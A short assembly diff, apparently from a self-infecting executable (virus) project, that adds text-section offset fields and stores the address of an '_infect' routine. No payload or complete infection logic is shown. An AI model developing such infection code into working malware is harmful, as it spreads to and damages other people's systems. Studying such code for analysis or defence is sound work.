@@ -26,10 +26,14 @@ jmp begin
 diff: db `00000000`
 memaddr: db `00000000`
 size: db `00000000`
+text_start: db `00000000`
+text_length: db `00000000`
 
 begin:
 	mov r14, QWORD[rel diff]
 	lea rax, [rel _infect]
+
+	mov QWORD[rel memaddr], rax
 	
 	sub rax, r14
 	mov r14, rax
